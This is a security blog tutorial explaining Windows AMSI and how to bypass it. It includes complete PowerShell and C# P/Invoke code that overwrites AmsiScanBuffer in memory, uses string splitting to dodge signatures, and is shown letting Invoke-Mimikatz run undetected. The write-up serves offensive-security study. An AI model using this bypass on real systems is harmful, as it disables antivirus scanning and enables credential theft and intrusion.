---
id: "como-parchear-amsiscanbuffer-para-evadir-amsi"
title: "How to Patch AmsiScanBuffer to Evade AMSI"
author: "miguel-angel-cortes"
publishedDate: 2023-03-27
updatedDate: 2023-03-27
image: "https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-0.webp"
description: "Learn how to evade AMSI on Windows by patching the AmsiScanBuffer function, including the use of pinvoke to call native APIs and obfuscation techniques."
categories:
  - "windows"
draft: false
featured: false
lang: "en"
---

In this article, we will be looking at the AMSI concept, how it works, and how it can be evaded by patching one of its functions.

- [Introduction to AMSI](#introduction-to-amsi)
- [amsi.dll Functions](#amsidll-functions)
- [Obfuscation](#obfuscation)
- [Patching the AmsiScanBuffer() Function from amsi.dll](#patching-the-amsiscanbuffer-function-from-amsidll)

## Introduction to AMSI

With the release of Windows 10, Microsoft introduced AMSI, an application programming interface (API) that allows malware detection in a wide variety of programming languages, including PowerShell. AMSI acts as a bridge that connects applications with antivirus software. Every command, macro, or script that runs in PowerShell, or in any other programming language compatible with AMSI, is sent to the antivirus software through AMSI for analysis.

![AMSI operation diagram as a bridge between applications and antivirus](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-1.avif)

Although AMSI was initially introduced for PowerShell, over time it has been extended to other programming languages such as JScript, VBScript, VBA, and .NET (although really anyone can integrate AMSI with their programs using the API calls offered by AMSI Interface). This means that, for example (practical case), if an .exe file is written in a programming language compatible with .NET, such as C# or Visual Basic .NET, and is designed to interact with the Windows operating system, AMSI will be present to analyze its content.

The AMSI API calls that the program can use (in our case PowerShell) are defined within the `amsi.dll` file. As soon as the PowerShell process starts, `amsi.dll` is loaded into it. We can verify this with [Process Hacker](https://processhacker.sourceforge.io/):

![Process Hacker showing amsi.dll loaded in PowerShell](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-2.avif)

AMSI exports certain API functions to be used by the process to communicate with the antivirus software through RPC:

![Functions exported by amsi.dll](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-3.avif)

Among them, the one we will be patching to bypass it.

## amsi.dll Functions

`AmsiInitialize`: The program uses this function to initialize the AMSI interface in a Windows application. The function takes as input the name of the application that is initializing AMSI and returns a session identifier that is used to identify the application's malware scanning session.

```c
HRESULT AmsiInitialize(
    LPCWSTR appName,
    HAMSICONTEXT *amsiContext
);
```

`AmsiOpenSession`: Takes the context that was returned from the previous call and allows switching to that session. We can host multiple AMSI sessions if we want.

```c
HRESULT AmsiOpenSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION *amsiSession
);
```

`AmsiScanString`: Takes our string and returns the result, i.e., 1 if the string is clean and 32768 if the string is malicious.

```c
HRESULT AmsiScanString(
    HAMSICONTEXT amsiContext,
    LPCWSTR string,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);
```

`AmsiScanBuffer`: Similar to `AmsiScanString()`, this function takes the buffer instead of the string and returns the result.

```c
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);
```

`AmsiCloseSession`: This function simply closes the session that was previously opened by the program using `AmsiOpenSession()`.

```c
void AmsiCloseSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION amsiSession
);
```

We have briefly looked at the API functions that AMSI uses, but we will focus specifically on the `AmsiScanString()` and `AmsiScanBuffer()` functions.

## Obfuscation

Obfuscation is a technique used by attackers to make it difficult for the AV to analyze their code. This is normally done by using various code transformations that make it harder to understand the code's intention, but without changing its functionality.

For example, an attacker can use techniques such as code encryption, variable renaming, and code splitting to make it difficult to understand the code's functionality.

AMSI sends the content to the AV to determine if it is malicious, so if the content is obfuscated the AV cannot detect if it is malicious.

![AMSI obfuscation concept](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-4.avif)

If we can obfuscate the words in the input buffer detected by the AV, we can run almost any script without problems. However, obfuscating or removing all detected words is not entirely possible because in addition to taking quite a bit of time, each AV vendor will have its own signature and constantly updating. In this post we will look at an alternative to this technique.

## Patching the AmsiScanBuffer() Function from amsi.dll

This method patches the `AmsiScanBuffer()` function. The `amsi.dll` library is loaded in the same virtual memory space, so we have almost complete control over that address space.

> This function is similar to `AmsiScanString`, but instead of scanning a character string, it scans a memory buffer for malicious content. This is useful for analyzing files or code fragments in memory that are not represented as character strings.
> 
> Reminder of how `AmsiScanBuffer()` works

Let's take a look at the AMSI API calls that PowerShell makes with the help of [FridaTools](https://github.com/frida/frida-tools). When we start a session in Frida, it creates handler files that we can modify to print arguments and results at runtime. In our case, we will edit the following file:

- `C:\Users\User__handlers__\amsi.dll\AmsiScanBuffer.js`

![Frida handler file for AmsiScanBuffer](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-5.avif)

In the image above we can see that we have modified the file to print those arguments and the scan result to the output. Once we have edited the file, we can start the [tracer](https://github.com/frida/frida-tools/blob/main/frida_tools/tracer.py):

![Starting Frida tracer](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-6.avif)

This way, we will be monitoring the PowerShell process in real time:

![Real-time monitoring of PowerShell process](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-7.avif)

![AMSI scan result showing malware detection](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-8.avif)

As mentioned earlier, if the string that the function gets to analyze is malicious, the scan returns 32768 as a result. On the other hand, if the string is not detected as malicious, the scan result is 1.

Let's analyze the `AmsiScanBuffer()` function in more detail. To do this, we will use [IDA Freeware](https://hex-rays.com/ida-free/):

![Opening amsi.dll in IDA Freeware](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-9.avif)

We will open the `amsi.dll` binary and search for the function:

![AmsiScanBuffer analysis in IDA showing code blocks](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-10.avif)

In the image above we can see several code blocks. The scan is formed by the instructions in the box on the left. The instructions in the code block at the top right are called when the argument that is passed is not valid, `80070057h` corresponds to `E_INVALIDARG`. Then the function terminates.

Knowing this, we can patch the beginning of the `AmsiScanBuffer()` function with the instructions from the code block we mentioned above, i.e.:

- `mov eax, 80070057h; ret`

This is so that when `AmsiScanBuffer()` is called, it returns the error code instead of performing the AMSI scan. The byte that corresponds to these instructions is `b857000780`.

To patch the `AmsiScanBuffer()` function we will use the following API calls:

- `LoadLibrary`: To load the `amsi.dll` DLL into the address space.
- `GetProcAddress`: To get the memory address of `AmsiScanBuffer()`.
- `VirtualProtect`: To add write permissions to the memory region, since by default it has RX permissions. We need to give write permissions to be able to overwrite the instructions we mentioned earlier and then we will put the memory region back to RX.

To be able to call these API calls, we have to make use of [pinvoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke). First we need to define these methods with C# using this tool (which allows us to call unmanaged APIs in managed code) and then load the C# code into the PowerShell session using `Add-Type`.

First of all, the difference between managed and unmanaged code is as follows:

> Managed code is code that runs under an environment controlled by an execution manager, such as .NET Framework or .NET Core. This environment automatically handles key aspects, such as memory allocation, garbage collection, and security. Managed code is generally written in high-level languages such as C# or Visual Basic .NET and offers greater abstraction and ease of use for developers.
> 
> Managed code

> Unmanaged code, on the other hand, runs directly on the operating system without the intervention of an execution manager. This type of code is usually written in low-level languages such as C or C++ and is used to interact directly with operating system resources. Memory management, security, and other aspects are the developer's responsibility in the case of unmanaged code.
> 
> Unmanaged code

That said, the following code makes use of pinvoke to implement API calls:

```csharp
$code = @"
using System;
using System.Runtime.InteropServices;

public class WinApi {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
}"@
```

In this code, we load the functions we will use.

`System.Runtime.InteropServices` is where pinvoke is implemented. Then we define the signature for each native API.

- `Add-Type $code`

We add the code to the PowerShell session with `Add-Type`. Once this is done, we can now use the API calls we have implemented in the PowerShell session. Now, we enter the following:

```powershell
$amsiDll = [WinApi]::LoadLibrary("amsi.dll")
$asbAddr = [WinApi]::GetProcAddress($amsiDll,"Ams"+"iScan"+"Buf"+"fer")
$a = 0xB8
$b = 0x57
$c = 0x00
$d = 0x07
$e = 0x80
$f = 0xC3
$ret = ( $a,$b,$c,$d,$e,$f )
$out = 0
```

When executing this block of code in PowerShell, what we are doing is:

1. First we get the handle of the `amsi.dll` library and then call `GetProcAddress()` to get the address of the `AmsiScanBuffer` function within `amsi.dll`.
2. We define a variable called `$ret` that contains the bytes that will overwrite the first instructions of `AmsiScanBuffer()`, `$out` is what will contain the old memory region permission returned by `VirtualProtect`.

```powershell
[WinApi]::VirtualProtect($asbAddr, $ret.Length, 0x40, [ref]$out)
[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
[WinApi]::VirtualProtect($asbAddr, $ret.Length, $out, [ref]$null)
```

Now, in the code above, we are calling the `VirtualProtect()` function to change the memory region permission of `AmsiScanBuffer()` to RWX (0x40) and then we use `Marshal.Copy` to copy the bytes from the managed memory region to an unmanaged one. Then we call `VirtualProtect()` again to change the permissions of `AmsiScanBuffer()` to the permissions we have stored in `$out`.

![AMSI bypass execution in PowerShell](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-11.avif)

Now, if we launch `Invoke-Mimikatz` the AMSI alert does not fire, so we have successfully overwritten the first bytes of the `AmsiScanBuffer()` function.

![Invoke-Mimikatz running without AMSI alerts](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-12.avif)

As a curiosity, this is the way [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) bypasses AMSI with its function:

![Evil-WinRM code for AMSI bypass part 1](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-13.avif)

![Evil-WinRM code for AMSI bypass part 2](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-14.avif)
